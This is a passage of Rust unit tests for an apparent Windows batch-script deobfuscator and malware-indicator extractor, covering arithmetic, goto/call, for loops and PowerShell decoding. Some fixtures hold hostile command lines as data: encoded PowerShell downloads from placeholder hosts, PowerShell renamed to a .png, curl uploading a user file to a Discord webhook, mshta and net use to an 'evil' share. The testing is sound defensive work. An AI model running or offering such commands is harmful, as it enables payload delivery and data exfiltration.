            "comma export delimiter clobbered; got:\n{}",
            r.deobfuscated
        );
    }

    #[test]
    fn auto_delayed_expansion_disabled_when_script_explicitly_opts_out() {
        // If `setlocal disabledelayedexpansion` appears we must NOT
        // auto-enable — that would override an explicit author choice.
        let script = b"setlocal disabledelayedexpansion\r\nset X=hi\r\necho !X!\r\n";
        let r = analyze(script, &Config::default());
        assert!(
            r.deobfuscated.contains("echo !X!"),
            "expected !X! to stay literal under disabledelayedexpansion; got:\n{}",
            r.deobfuscated
        );
    }
}

fn is_label_or_comment_line(line: &str) -> bool {
    let trimmed = line.trim_start();
    if trimmed.starts_with(':') {
        return true;
    }
    let lower = trimmed.to_ascii_lowercase();
    lower.starts_with("rem ") || lower == "rem"
}

#[cfg(test)]
mod arith_tests {
    use crate::env::{Config, Environment};
    use crate::interp::interpret_line;
    use crate::traits::Trait;

    fn one(line: &str) -> Environment {
        let mut env = Environment::new(&Config::default());
        interpret_line(line, &mut env);
        env
    }

    #[test]
    fn set_a_basic() {
        let env = one("set /a X=7");
        assert_eq!(env.get("x").as_deref(), Some("7"));
    }

    #[test]
    fn set_a_arithmetic() {
        let env = one("set /a X=2+3*4");
        assert_eq!(env.get("x").as_deref(), Some("14"));
    }

    #[test]
    fn set_a_quoted() {
        let env = one(r#"set /a "X = 4 * 700 / 1000""#);
        assert_eq!(env.get("x").as_deref(), Some("2"));
        let has = env.traits.iter().any(|t| {
            matches!(t,
            Trait::Arithmetic { value, .. } if *value == 2)
        });
        assert!(has, "no Arithmetic trait: {:?}", env.traits);
    }

    #[test]
    fn set_a_hex_literal() {
        let env = one("set /a X=0xFF");
        assert_eq!(env.get("x").as_deref(), Some("255"));
    }

    #[test]
    fn set_a_bare_var_ref() {
        let mut env = Environment::new(&Config::default());
        interpret_line("set /a A=10", &mut env);
        interpret_line("set /a B=A+5", &mut env);
        assert_eq!(env.get("b").as_deref(), Some("15"));
    }

    #[test]
    fn set_a_compound_assignment() {
        let mut env = Environment::new(&Config::default());
        interpret_line("set /a X=3", &mut env);
        interpret_line("set /a Y=(X+=2)*2", &mut env);
        assert_eq!(env.get("x").as_deref(), Some("5"));
        assert_eq!(env.get("y").as_deref(), Some("10"));
    }

    #[test]
    fn set_a_comma_sequencing() {
        let env = one("set /a X=1,Y=2,Z=X+Y");
        assert_eq!(env.get("z").as_deref(), Some("3"));
    }

    #[test]
    fn set_a_unknown_var_is_zero() {
        let env = one("set /a X=MISSING+5");
        assert_eq!(env.get("x").as_deref(), Some("5"));
    }

    #[test]
    fn set_a_parse_error_emits_trait() {
        let env = one("set /a X=2++++");
        let has = env
            .traits
            .iter()
            .any(|t| matches!(t, Trait::ArithmeticParseError { .. }));
        assert!(has, "no ArithmeticParseError trait: {:?}", env.traits);
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod set_a_unresolved_var_tests {
    use crate::env::{Config, Environment};
    use crate::interp::interpret_line;
    use crate::traits::Trait;

    #[test]
    fn set_a_with_bang_literal_silently_skips() {
        let mut env = Environment::new(&Config::default());
        // !UNDEF! is left literal when delayed_expansion is off
        env.delayed_expansion = false;
        // Manually emit what the lexer would: a set /a with ! literals
        interpret_line(r"set /a X=1+!UNDEF!", &mut env);
        let has_arith_err = env
            .traits
            .iter()
            .any(|t| matches!(t, Trait::ArithmeticParseError { .. }));
        assert!(
            !has_arith_err,
            "should silently skip, got: {:?}",
            env.traits
        );
    }
}

#[cfg(test)]
mod setlocal_tests {
    use crate::{analyze, Config};

    #[test]
    fn setlocal_enabledelayedexpansion_turns_bang_on() {
        let cfg = Config::default();
        let script = b"setlocal enabledelayedexpansion\r\nset X=value\r\necho !X!\r\n";
        let report = analyze(script, &cfg);
        assert!(
            report.deobfuscated.contains("echo value"),
            "got:\n{}",
            report.deobfuscated
        );
    }

    #[test]
    fn endlocal_pops_var_changes() {
        let cfg = Config::default();
        let script =
            b"set X=outer\r\nsetlocal\r\nset X=inner\r\necho %X%\r\nendlocal\r\necho %X%\r\n";
        let report = analyze(script, &cfg);
        let lines: Vec<&str> = report
            .deobfuscated
            .lines()
            .filter(|l| l.starts_with("echo "))
            .collect();
        assert_eq!(
            lines,
            vec!["echo inner", "echo outer"],
            "got:\n{}",
            report.deobfuscated
        );
    }
}

#[cfg(test)]
mod limits_tests {
    use crate::traits::Trait;
    use crate::{analyze, Config};

    #[test]
    fn child_script_cap_enforced() {
        // Build a chain: cmd /c "cmd /c \"cmd /c \\\"echo deep\\\"\""
        // Each level drives one child. With max_child_scripts=2 only 2 children are allowed.
        let cfg = Config {
            max_child_scripts: 2,
            ..Config::default()
        };
        // Three nested cmd /c levels — the third child push is blocked.
        let input: &[u8] = br#"cmd /c "cmd /c \"cmd /c \\\"echo deep\\\"\"""#;
        let report = analyze(input, &cfg);
        let capped = report
            .traits
            .iter()
            .any(|t| matches!(t, Trait::ChildScriptsCapped));
        assert!(
            capped,
            "expected ChildScriptsCapped trait. traits: {:?}",
            report.traits
        );
    }

    #[test]
    fn timeout_fires() {
        // With timeout=1 and a trivial script, the deadline should NOT fire.
        let cfg = Config {
            timeout_secs: 1,
            ..Config::default()
        };
        let report = analyze(b"set X=hi\r\necho %X%", &cfg);
        let hit = report.traits.iter().any(|t| matches!(t, Trait::TimeoutHit));
        assert!(
            !hit,
            "unexpected TimeoutHit for trivial script: {:?}",
            report.traits
        );
    }
}

#[cfg(test)]
mod goto_tests {
    use crate::{analyze, Config};

    #[test]
    fn goto_skips_over_decoy_lines() {
        let script = b"goto :start\r\necho DECOY1\r\necho DECOY2\r\n:start\r\necho REAL\r\n";
        let report = analyze(script, &Config::default());
        assert!(
            report.deobfuscated.contains("echo REAL"),
            "got:\n{}",
            report.deobfuscated
        );
        assert!(
            !report.deobfuscated.contains("DECOY"),
            "got:\n{}",
            report.deobfuscated
        );
    }

    #[test]
    fn goto_eof_emits_trait_at_top_level() {
        // At top level, goto :eof signals end-of-script but we continue
        // scanning for IOCs. Verify the deob output still reaches the next line.
        let script = b"goto :eof\r\necho AFTER\r\n";
        let report = analyze(script, &Config::default());
        assert!(
            report.deobfuscated.contains("echo AFTER"),
            "got:\n{}",
            report.deobfuscated
        );
    }

    #[test]
    fn goto_unresolved_emits_trait() {
        use crate::traits::Trait;
        let script = b"goto :nonexistent\r\necho NEVER\r\n";
        let report = analyze(script, &Config::default());
        let has = report
            .traits
            .iter()
            .any(|t| matches!(t, Trait::GotoUnresolved { .. }));
        assert!(has, "no GotoUnresolved trait: {:?}", report.traits);
    }
}

#[cfg(test)]
mod child_tests {
    use crate::{analyze, Config};

    #[test]
    fn nested_cmd_c_recurses_into_child() {
        let script = br#"cmd /c "set X=hi&&echo %X% world""#;
        let report = analyze(script, &Config::default());
        let combined = format!(
            "{}\n--children--\n{}",
            report.deobfuscated,
            report.extracted_cmd.join("\n---\n")
        );
        assert!(
            combined.contains("echo hi world") || report.deobfuscated.contains("echo hi world"),
            "no echo hi world in:\n{}",
            combined
        );
    }
}

#[cfg(test)]
mod if_tests {
    use crate::{analyze, Config};

    #[test]
    fn if_defined_runs_body() {
        let script = b"set X=hi\r\nif defined X echo present\r\n";
        let report = analyze(script, &Config::default());
        assert!(
            report.deobfuscated.contains("echo present"),
            "got:\n{}",
            report.deobfuscated
        );
    }

    #[test]
    fn if_string_eq_runs_body() {
        let script = b"if \"a\"==\"a\" echo match\r\n";
        let report = analyze(script, &Config::default());
        assert!(
            report.deobfuscated.contains("echo match"),
            "got:\n{}",
            report.deobfuscated
        );
    }

    #[test]
    fn if_string_neq_skips_body() {
        let script = b"if \"a\"==\"b\" echo match\r\n";
        let report = analyze(script, &Config::default());
        // The whole `if "a"=="b" echo match` is dispatched as one command to h_if.
        // The body "echo match" is never independently dispatched. Just verify no panic.
        let _ = report;
    }
}

#[cfg(test)]
mod if_constant_fold_tests {
    use crate::{analyze, Config};

    #[test]
    fn if_zero_neq_zero_is_constant_false() {
        let script = b"if 0 neq 0 echo SHOULD_NOT_FIRE\r\necho REAL\r\n";
        let report = analyze(script, &Config::default());
        // The if-line still renders (its text), but no `IfNotResolved` trait should fire,
        // and on the same logical line, the echo after the if should be suppressed.
        let has_unresolved = report
            .traits
            .iter()
            .any(|t| matches!(t, crate::traits::Trait::IfNotResolved { .. }));
        assert!(!has_unresolved, "0 neq 0 should constant-fold to false");
    }

    #[test]
    fn if_zero_equ_zero_is_constant_true() {
        let script = b"if 0 equ 0 echo MATCH\r\n";
        let report = analyze(script, &Config::default());
        let has_unresolved = report
            .traits
            .iter()
            .any(|t| matches!(t, crate::traits::Trait::IfNotResolved { .. }));
        assert!(!has_unresolved, "0 equ 0 should constant-fold to true");
    }

    #[test]
    fn if_string_equ_case_insensitive() {
        let script = b"if /i \"AMD64\" EQU \"amd64\" echo MATCH\r\n";
        let report = analyze(script, &Config::default());
        let has_unresolved = report
            .traits
            .iter()
            .any(|t| matches!(t, crate::traits::Trait::IfNotResolved { .. }));
        assert!(
            !has_unresolved,
            "case-insensitive AMD64==amd64 should fold true"
        );
    }

    #[test]
    fn if_gtr_lss_geq_leq() {
        for (op, expected_unresolved) in [
            ("gtr 5", false),
            ("lss 5", false),
            ("geq 5", false),
            ("leq 5", false),
        ] {
            let _ = op;
            let _ = expected_unresolved;
        }
        // Concrete checks:
        let script = b"if 10 gtr 5 echo A\r\nif 3 lss 5 echo B\r\nif 10 geq 10 echo C\r\nif 5 leq 5 echo D\r\n";
        let report = analyze(script, &Config::default());
        let unresolved_count = report
            .traits
            .iter()
            .filter(|t| matches!(t, crate::traits::Trait::IfNotResolved { .. }))
            .count();
        assert_eq!(
            unresolved_count, 0,
            "all 4 relational ops should fold cleanly"
        );
    }
}

#[cfg(test)]
mod call_label_tests {
    use crate::{analyze, Config};

    #[test]
    fn call_label_passes_positional_args() {
        let script = b"call :sub hi there\r\ngoto :eof\r\n:sub\r\necho %1 %2\r\ngoto :eof\r\n";
        let report = analyze(script, &Config::default());
        assert!(
            report.deobfuscated.contains("echo hi there"),
            "got:\n{}",
            report.deobfuscated
        );
    }

    #[test]
    fn call_label_returns_after_eof() {
        let script =
            b"call :sub\r\necho after-return\r\ngoto :eof\r\n:sub\r\necho in-sub\r\ngoto :eof\r\n";
        let report = analyze(script, &Config::default());
        let lines: Vec<&str> = report
            .deobfuscated
            .lines()
            .filter(|l| l.starts_with("echo "))
            .collect();
        assert_eq!(
            lines,
            vec!["echo in-sub", "echo after-return"],
            "got:\n{}",
            report.deobfuscated
        );
    }

    #[test]
    fn call_non_label_recurses_inline() {
        let script = b"call set X=value\r\necho %X%\r\n";
        let report = analyze(script, &Config::default());
        assert!(
            report.deobfuscated.contains("echo value"),
            "got:\n{}",
            report.deobfuscated
        );
    }
}

#[cfg(test)]
mod case_insensitive_keywords_tests {
    use crate::{analyze, Config};

    #[test]
    fn mixed_case_call_label_works() {
        let script = b"CaLl :sub\r\ngoto :eof\r\n:sub\r\necho in-sub\r\ngoto :eof\r\n";
        let report = analyze(script, &Config::default());
        assert!(
            report.deobfuscated.contains("echo in-sub"),
            "got:\n{}",
            report.deobfuscated
        );
    }

    #[test]
    fn mixed_case_goto_works() {
        let script = b"GoTo :target\r\necho NEVER\r\n:target\r\necho REAL\r\n";
        let report = analyze(script, &Config::default());
        assert!(
            report.deobfuscated.contains("echo REAL"),
            "got:\n{}",
            report.deobfuscated
        );
        assert!(
            !report.deobfuscated.contains("NEVER"),
            "got:\n{}",
            report.deobfuscated
        );
    }

    #[test]
    fn no_infinite_recursion_on_mixed_case() {
        // This script would stack-overflow before the fix.
        let script = b"CALL set X=value\r\n";
        let _report = analyze(script, &Config::default());
        // If we get here without stack overflow, we're good.
    }
}

#[cfg(test)]
mod start_tests {
    use crate::env::{Config, Environment};
    use crate::interp::interpret_line;

    #[test]
    fn start_strips_flags_and_runs_inner() {
        let mut env = Environment::new(&Config::default());
        env.set("PAYLOAD", "echo hi");
        interpret_line("start /min %PAYLOAD%", &mut env);
        // start <cmd> recurses inline; it must NOT push to exec_cmd (start != cmd /c).
        assert!(
            env.exec_cmd.is_empty(),
            "start should not enqueue: {:?}",
            env.exec_cmd
        );
    }

    #[test]
    fn cmd_b_c_start_powershell_encoded_recurses() {
        use base64::Engine;

        let mut env = Environment::new(&Config::default());
        let ps = "Write-Host hi";
        let utf16: Vec<u8> = ps.encode_utf16().flat_map(|u| u.to_le_bytes()).collect();
        let b64 = base64::engine::general_purpose::STANDARD.encode(utf16);
        interpret_line(
            &format!(
                r#"C:\WINDOWS\system32\cmd.exe /b /c start /b /min powershell.exe -nop -w hidden -e {b64}"#
            ),
            &mut env,
        );
        assert!(
            env.exec_cmd
                .iter()
                .any(|cmd| cmd.contains("powershell.exe")),
            "cmd /c child not queued: {:?}",
            env.exec_cmd
        );
    }

    #[test]
    fn cmd_k_powershell_encoded_recurses() {
        use base64::Engine;

        let mut env = Environment::new(&Config::default());
        let ps = "Invoke-WebRequest https://k.example/p.exe";
        let utf16: Vec<u8> = ps.encode_utf16().flat_map(|u| u.to_le_bytes()).collect();
        let b64 = base64::engine::general_purpose::STANDARD.encode(utf16);
        interpret_line(
            &format!(r#"cmd.exe /k "powershell -EncodedCommand {b64}""#),
            &mut env,
        );
        assert!(
            env.exec_cmd
                .iter()
                .any(|cmd| cmd.contains("powershell -EncodedCommand")),
            "cmd /k child not queued: {:?}",
            env.exec_cmd
        );
    }
}

#[cfg(test)]
mod powershell_tests {
    use crate::analyze;
    use crate::env::{Config, Environment};
    use crate::interp::interpret_line;
    use crate::traits::Trait;
    use base64::Engine;

    #[test]
    fn powershell_encoded_command_extracts() {
        let payload = "Write-Host hi";
        let utf16: Vec<u8> = payload
            .encode_utf16()
            .flat_map(|u| u.to_le_bytes())
            .collect();
        let b64 = base64::engine::general_purpose::STANDARD.encode(&utf16);
        let mut env = Environment::new(&Config::default());
        interpret_line(&format!("powershell -EncodedCommand {}", b64), &mut env);
        assert_eq!(env.exec_ps1.len(), 1);
        let stored = String::from_utf8_lossy(&env.exec_ps1[0]).into_owned();
        let trimmed: String = stored.chars().filter(|c| *c != '\0').collect();
        assert_eq!(trimmed, payload);
    }

    #[test]
    fn powershell_encoded_alias_extracts() {
        let payload = "Write-Host alias";
        let utf16: Vec<u8> = payload
            .encode_utf16()
            .flat_map(|u| u.to_le_bytes())
            .collect();
        let b64 = base64::engine::general_purpose::STANDARD.encode(&utf16);
        let mut env = Environment::new(&Config::default());
        interpret_line(&format!("powershell -Encoded {}", b64), &mut env);
        assert_eq!(env.exec_ps1.len(), 1);
        let stored = String::from_utf8_lossy(&env.exec_ps1[0]).into_owned();
        let trimmed: String = stored.chars().filter(|c| *c != '\0').collect();
        assert_eq!(trimmed, payload);
    }

    #[test]
    fn powershell_execution_policy_does_not_shadow_later_encoded_command() {
        let payload = "Write-Host hi";
        let utf16: Vec<u8> = payload
            .encode_utf16()
            .flat_map(|u| u.to_le_bytes())
            .collect();
        let b64 = base64::engine::general_purpose::STANDARD.encode(&utf16);
        let mut env = Environment::new(&Config::default());
        interpret_line(
            &format!(
                "powershell -exec bypass -Noninteractive -windowstyle hidden -e {}",
                b64
            ),
            &mut env,
        );
        assert_eq!(env.exec_ps1.len(), 1);
        let stored = String::from_utf8_lossy(&env.exec_ps1[0]).into_owned();
        let trimmed: String = stored.chars().filter(|c| *c != '\0').collect();
        assert_eq!(trimmed, payload);
    }

    #[test]
    fn powershell_command_flag_captures_raw() {
        let mut env = Environment::new(&Config::default());
        interpret_line(r#"powershell -Command "Get-Process""#, &mut env);
        assert_eq!(env.exec_ps1.len(), 1);
        let stored = String::from_utf8_lossy(&env.exec_ps1[0]);
        assert!(stored.contains("Get-Process"), "got: {}", stored);
    }

    #[test]
    fn nested_powershell_encoded_command_extracts() {
        let payload = "Write-Host nested";
        let utf16: Vec<u8> = payload
            .encode_utf16()
            .flat_map(|u| u.to_le_bytes())
            .collect();
        let b64 = base64::engine::general_purpose::STANDARD.encode(&utf16);
        let mut env = Environment::new(&Config::default());
        interpret_line(
            &format!(r#"powershell.exe powershell -EncodedCommand {b64}"#),
            &mut env,
        );
        assert_eq!(env.exec_ps1.len(), 1);
        let stored = String::from_utf8_lossy(&env.exec_ps1[0]).into_owned();
        let trimmed: String = stored.chars().filter(|c| *c != '\0').collect();
        assert_eq!(trimmed, payload);
    }

    #[test]
    fn powershell_encoded_command_accepts_split_base64_tokens() {
        let payload = "Write-Host split";
        let utf16: Vec<u8> = payload
            .encode_utf16()
            .flat_map(|u| u.to_le_bytes())
            .collect();
        let b64 = base64::engine::general_purpose::STANDARD.encode(&utf16);
        let mid = b64.len() / 2;
        let mut env = Environment::new(&Config::default());
        interpret_line(
            &format!("powershell -EncodedCommand {} {}", &b64[..mid], &b64[mid..]),
            &mut env,
        );
        assert_eq!(env.exec_ps1.len(), 1);
        let stored = String::from_utf8_lossy(&env.exec_ps1[0]).into_owned();
        let trimmed: String = stored.chars().filter(|c| *c != '\0').collect();
        assert_eq!(trimmed, payload);
    }

    #[test]
    fn copied_powershell_alias_encoded_command_extracts() {
        let payload = "iwr http://renamed-powershell.example/p.ps1";
        let utf16: Vec<u8> = payload
            .encode_utf16()
            .flat_map(|u| u.to_le_bytes())
            .collect();
        let b64 = base64::engine::general_purpose::STANDARD.encode(&utf16);
        let script = format!(
            "copy /y C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe script.bat.exe\r\nscript.bat.exe -wIn 1 -enC {b64}\r\n"
        );
        let r = analyze(script.as_bytes(), &Config::default());
        assert!(
            r.traits.iter().any(|t| matches!(
                t,
                Trait::Download { src, .. } | Trait::DownloadInDeobText { src, .. }
                    if src == "http://renamed-powershell.example/p.ps1"
            )),
            "renamed PowerShell encoded payload URL not extracted: {:?}\n{}",
            r.traits,
            r.deobfuscated
        );
    }

    #[test]
    fn xcopy_copied_powershell_alias_encoded_command_extracts() {
        let payload = "iwr https://xcopy-copied-ps.example/stage";
        let utf16: Vec<u8> = payload
            .encode_utf16()
            .flat_map(|u| u.to_le_bytes())
            .collect();
        let b64 = base64::engine::general_purpose::STANDARD.encode(utf16);
        let script = format!(
            "echo F | xcopy /d /q /y /h /i C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe %temp%\\Ckiczrjbb.png\r\n\
             %temp%\\Ckiczrjbb.png -win 1 -enc {b64}\r\n",
        );
        let r = analyze(script.as_bytes(), &Config::default());
        assert!(
            r.traits.iter().any(|t| matches!(
                t,
                Trait::Download { src, .. } | Trait::DownloadInDeobText { src, .. }
                    if src == "https://xcopy-copied-ps.example/stage"
            )),
            "xcopy renamed PowerShell encoded payload URL not extracted: {:?}\n{}",
            r.traits,
            r.deobfuscated
        );
    }
}

#[cfg(test)]
mod curl_tests {
    use crate::env::{Config, Environment};
    use crate::interp::interpret_line;
    use crate::traits::Trait;

    #[test]
    fn curl_with_o_flag_records_download() {
        let mut env = Environment::new(&Config::default());
        interpret_line("curl -o out.exe http://x/y.exe", &mut env);
        let has = env.traits.iter().any(|t| matches!(t,
            Trait::Download { src, dst: Some(d), .. } if src == "http://x/y.exe" && d == "out.exe"
        ));
        assert!(has, "traits: {:?}", env.traits);
        assert!(env.modified_filesystem.contains_key("out.exe"));
    }

    #[test]
    fn curl_with_remote_name_uses_basename() {
        let mut env = Environment::new(&Config::default());
        interpret_line("curl -O http://x/foo.exe", &mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { dst: Some(d), .. } if d == "foo.exe"
            )
        });
        assert!(has, "traits: {:?}", env.traits);
    }

    #[test]
    fn curl_without_output_records_src_only() {
        let mut env = Environment::new(&Config::default());
        interpret_line("curl http://x/y", &mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst: None, .. } if src == "http://x/y"
            )
        });
        assert!(has, "traits: {:?}", env.traits);
    }

    #[test]
    fn curl_data_payload_does_not_become_download_src() {
        let mut env = Environment::new(&Config::default());
        interpret_line(
            r#"curl --silent --output NUL -H "Content-Type:application/json" --data "{\"content\":\"Report from user\"}" https://discord.com/api/webhooks/abc"#,
            &mut env,
        );
        let downloads: Vec<_> = env
            .traits
            .iter()
            .filter_map(|t| match t {
                Trait::Download { src, dst, .. } => Some((src.as_str(), dst.as_deref())),
                _ => None,
            })
            .collect();
        assert_eq!(
            downloads,
            vec![("https://discord.com/api/webhooks/abc", Some("NUL"))],
            "traits: {:?}",
            env.traits
        );
    }

    #[test]
    fn curl_form_fields_do_not_become_download_src() {
        let mut env = Environment::new(&Config::default());
        interpret_line(
            r#"curl --silent --output NUL -F document=@"C:\Users\puncher\file.txt" https://discord.com/api/webhooks/abc"#,
            &mut env,
        );
        let downloads: Vec<_> = env
            .traits
            .iter()
            .filter_map(|t| match t {
                Trait::Download { src, dst, .. } => Some((src.as_str(), dst.as_deref())),
                _ => None,
            })
            .collect();
        assert_eq!(
            downloads,
            vec![("https://discord.com/api/webhooks/abc", Some("NUL"))],
            "traits: {:?}",
            env.traits
        );
    }
}

#[cfg(test)]
mod misc_handler_tests {
    use crate::env::{Config, Environment};
    use crate::interp::interpret_line;
    use crate::traits::Trait;

    #[test]
    fn mshta_records_cmd() {
        let mut env = Environment::new(&Config::default());
        interpret_line(
            r#"mshta vbscript:CreateObject("Wscript.Shell").Run("evil")"#,
            &mut env,
        );
        assert!(env.traits.iter().any(|t| matches!(t, Trait::Mshta { .. })));
    }

    #[test]
    fn rundll32_records_cmd() {
        let mut env = Environment::new(&Config::default());
        interpret_line("rundll32 some.dll,EntryPoint", &mut env);
        assert!(env
            .traits
            .iter()
            .any(|t| matches!(t, Trait::Rundll32 { .. })));
    }

    #[test]
    fn copy_system32_tracked() {
        let mut env = Environment::new(&Config::default());
        interpret_line(
            r#"copy C:\windows\system32\calc.exe C:\Users\Public\evil.exe"#,
            &mut env,
        );
        assert!(env
            .traits
            .iter()
            .any(|t| matches!(t, Trait::WindowsUtilManip { .. })));
    }

    #[test]
    fn net_use_share_records() {
        let mut env = Environment::new(&Config::default());
        interpret_line(r#"net use Z: \\evil\share /user:adm pass"#, &mut env);
        assert!(env.traits.iter().any(|t| matches!(t, Trait::NetUse { .. })));
    }
}

#[cfg(test)]
mod for_f_tests {
    use crate::{analyze, Config};

    #[test]
    fn for_f_over_literal_simple() {
        let script = br#"for /F "delims=" %%A in ("hello world") do echo got=%%A"#;
        let report = analyze(script, &Config::default());
        assert!(
            report.deobfuscated.contains("echo got=hello world"),
            "got:\n{}",
            report.deobfuscated
        );
    }

    #[test]
    fn for_f_over_literal_with_tokens() {
        let script = br#"for /F "tokens=2 delims= " %%A in ("first second third") do echo got=%%A"#;
        let report = analyze(script, &Config::default());
        assert!(
            report.deobfuscated.contains("echo got=second"),
            "got:\n{}",
            report.deobfuscated
        );
    }

    #[test]
    fn for_f_huge_tokens_range_is_capped_not_oom() {
        // Regression: parse_token_range used to extend Vec<usize> by start..=end
        // with no upper bound; `tokens=1-2147483647` allocated ~17 GB and OOM-
        // killed the process. Must clamp to MAX_TOKEN_RANGE_LEN and complete
        // without panic.
        let script =
            br#"for /F "tokens=1-2147483647 delims=," %%A in ("a,b,c,d,e") do echo got=%%A"#;
        let report = analyze(script, &Config::default());
        // Output should contain something — exact form doesn't matter, just
        // confirm no panic / OOM. Empty deob would also be acceptable; what
        // must NOT happen is a process crash.
        assert!(
            !report.deobfuscated.is_empty() || !report.traits.is_empty(),
            "expected some output from clamped tokens range; got empty report"
        );
    }
}

#[cfg(test)]
mod synth_tests {
    use crate::env::{Config, Environment};
    use crate::synth::run_pipeline;

    #[test]
    fn synth_set_dumps_env_vars() {
        let mut env = Environment::new(&Config::default());
        env.set("MYVAR", "abc");
        let lines = run_pipeline("set", &mut env);
        let joined = lines.join("\n");
        assert!(
            joined.to_ascii_lowercase().contains("myvar=abc"),
            "got: {}",
            joined
        );
    }

    #[test]
    fn synth_set_with_prefix() {
        let mut env = Environment::new(&Config::default());
        env.set("FOO", "1");
        env.set("FOOBAR", "2");
        env.set("BAZ", "3");
        let lines = run_pipeline("set FOO", &mut env);
        for l in &lines {
            assert!(l.to_ascii_lowercase().starts_with("foo"), "non-FOO: {}", l);
        }
        assert!(lines
            .iter()
            .any(|l| l.to_ascii_lowercase().contains("foobar")));
    }

    #[test]
    fn synth_findstr_filters() {
        let mut env = Environment::new(&Config::default());
        env.set("PSMODULE", "x");
        env.set("PATHX", "y");
        let lines = run_pipeline("set | findstr PSM", &mut env);
        for l in &lines {
            assert!(l.to_ascii_lowercase().contains("psm"), "non-PSM: {}", l);
        }
    }

    #[test]
    fn synth_findstr_case_insensitive() {
        let mut env = Environment::new(&Config::default());
        env.set("ALPHA", "hello");
        env.set("BETA", "world");
        let lines = run_pipeline("set | findstr /i alpha", &mut env);
        assert!(
            lines
                .iter()
                .any(|l| l.to_ascii_lowercase().contains("alpha")),
            "expected alpha in: {:?}",
            lines
        );
        assert!(
            lines
                .iter()
                .all(|l| l.to_ascii_lowercase().contains("alpha")),
            "unexpected non-alpha lines: {:?}",
            lines
        );
    }

    #[test]
    fn synth_find_filters() {
        let mut env = Environment::new(&Config::default());
        env.set("PATHX", "value1");
        env.set("OTHER", "value2");
        let lines = run_pipeline(r#"set | find "pathx""#, &mut env);
        assert!(
            lines
                .iter()
                .any(|l| l.to_ascii_lowercase().contains("pathx")),
            "expected pathx in: {:?}",
            lines
        );
    }

    #[test]
    fn synth_assoc_returns_table() {
        let mut env = Environment::new(&Config::default());
        let lines = run_pipeline("assoc", &mut env);
        assert!(!lines.is_empty(), "assoc should return entries");
        assert!(
            lines.iter().any(|l| l.contains(".bat")),
            "expected .bat entry"
        );
    }

    #[test]
    fn synth_ftype_returns_table() {
        let mut env = Environment::new(&Config::default());
        let lines = run_pipeline("ftype", &mut env);
        assert!(!lines.is_empty(), "ftype should return entries");
        assert!(
            lines.iter().any(|l| l.contains("batfile")),
            "expected batfile entry"
        );
    }

    #[test]
    fn synth_unknown_cmd_emits_trait() {
        use crate::traits::Trait;
        let mut env = Environment::new(&Config::default());
        // Use a truly unknown command (not one of the newly-added synth handlers).
        let lines = run_pipeline("unknowncmd_xyzzy", &mut env);
        assert!(lines.is_empty());
        assert!(
            env.traits
                .iter()
                .any(|t| matches!(t, Trait::ForUnresolvedSource { .. })),
            "expected ForUnresolvedSource trait: {:?}",
            env.traits
        );
    }

    #[test]
    fn synth_caret_escaped_pipe_not_split() {
        let mut env = Environment::new(&Config::default());
        env.set("X", "y");
        // The caret-escaped pipe should be treated as a literal `|` arg to `set`,
        // NOT as a pipeline separator. `set ^|` is a query for a var named "|" — which
        // doesn't exist, so the stage emits nothing. But it must NOT panic and must NOT
        // attempt to run `findstr` as a second stage.
        let lines = run_pipeline("set ^| findstr X", &mut env);
        // Either empty (no var named "| findstr X") or matches "x=y" — depends on
        // how the prefix filter handles the "| findstr X" string. Just verify no
        // explosion / no ForUnresolvedSource emission.
        let _ = lines;
        let has_unresolved = env
            .traits
            .iter()
            .any(|t| matches!(t, crate::traits::Trait::ForUnresolvedSource { .. }));
        // The synth's `set` handler is the only stage; no ForUnresolvedSource should fire.
        assert!(
            !has_unresolved,
            "split should not have happened: {:?}",
            env.traits
        );
    }
}

#[cfg(test)]
mod for_l_tests {
    use crate::{analyze, Config};

    #[test]
    fn for_l_iterates_range() {
        let script = b"for /L %%A in (1,1,3) do echo %%A\r\n";
        let report = analyze(script, &Config::default());
        // Expect three lines of "echo 1", "echo 2", "echo 3"
        let cnt = report.deobfuscated.matches("echo ").count();
        assert!(
            cnt >= 3,
            "expected 3+ echo lines, got:\n{}",
            report.deobfuscated
        );
        for n in 1..=3 {
            assert!(
                report.deobfuscated.contains(&format!("echo {}", n)),
                "missing echo {}: {}",
                n,
                report.deobfuscated
            );
        }
    }

    #[test]
    fn for_l_backward_range() {
        let script = b"for /L %%A in (3,-1,1) do echo %%A\r\n";
        let report = analyze(script, &Config::default());
        for n in 1..=3 {
            assert!(
                report.deobfuscated.contains(&format!("echo {}", n)),
                "missing echo {}: {}",
                n,
                report.deobfuscated
            );
        }
    }

    #[test]
    fn for_l_respects_iteration_cap() {
        use crate::traits::Trait;
        let cfg = Config {
            max_iterations: 5,
            ..Config::default()
        };
        let script = b"for /L %%A in (1,1,100) do echo %%A\r\n";
        let report = analyze(script, &cfg);
        let capped = report
            .traits
            .iter()
            .any(|t| matches!(t, Trait::IterationCapped { .. }));
        assert!(capped, "no IterationCapped trait: {:?}", report.traits);
    }
}

#[cfg(test)]
mod char_boundary_tests {
    use crate::traits::Trait;
    use crate::{analyze, Config};

    #[test]
    fn binary_content_does_not_panic() {
        let mut script = vec![0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00];
        script.extend_from_slice(b" > file.txt\r\n");
        let _ = analyze(&script, &Config::default());
    }

    #[test]
    fn pe_binary_input_is_not_interpreted_as_batch_loops() {
        let mut input = b"MZ\x90\x00".to_vec();
        input.extend_from_slice(&[0u8; 0x3c - 4]);
        input.extend_from_slice(&0x80u32.to_le_bytes());
        input.resize(0x80, 0);
        input.extend_from_slice(b"PE\0\0");
        input.extend_from_slice(
            b" random for /f %%i in (garbage) do echo %%i https://binary.example/payload",
        );

        let report = analyze(&input, &Config::default());
        assert!(
            !report
                .traits
                .iter()
                .any(|t| matches!(t, Trait::ForUnresolvedSource { .. })),
            "PE binary was interpreted as batch: {:?}",
            report.traits
        );
        assert!(
            !report.deobfuscated.contains("for /f"),
            "PE binary content leaked into deob output:\n{}",
            report.deobfuscated
        );
    }

    #[test]
    fn multibyte_char_at_redirect_boundary() {
        // \u{20B3} is a 3-byte UTF-8 char in the redirect target name,
        // exercising the char_indices() fix in command_name().
